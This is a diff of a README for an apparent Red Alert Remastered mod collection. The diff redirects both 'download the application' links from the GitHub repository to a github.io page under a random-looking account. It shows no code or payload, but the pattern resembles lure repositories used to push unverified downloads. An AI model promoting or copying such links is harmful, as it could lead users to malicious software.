@@ -1,6 +1,6 @@
 # 🎮 red-alert-remastered-mods-2026 - Best Red Alert Mods Collection
 
-[![Download Now](https://img.shields.io/badge/Download-Mods_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/stirruppumpportfolio3853/red-alert-remastered-mods-2026)
+[![Download Now](https://img.shields.io/badge/Download-Mods_2026-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://stirruppumpportfolio3853.github.io)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Welcome to the ultimate mod collection for Command & Conquer Red Alert Remastered! This package brings you the best community-created content for 2026, including new skirmish maps, balance patches, unit reskins, and full campaign overhauls. Whether you're a veteran commander or new to the battlefield, these mods will transform your gaming experience.
 
-Visit this link to download the application: [https://github.com/stirruppumpportfolio3853/red-alert-remastered-mods-2026](https://github.com/stirruppumpportfolio3853/red-alert-remastered-mods-2026)
+Visit this link to download the application: [https://stirruppumpportfolio3853.github.io](https://stirruppumpportfolio3853.github.io)
 
 ---
 
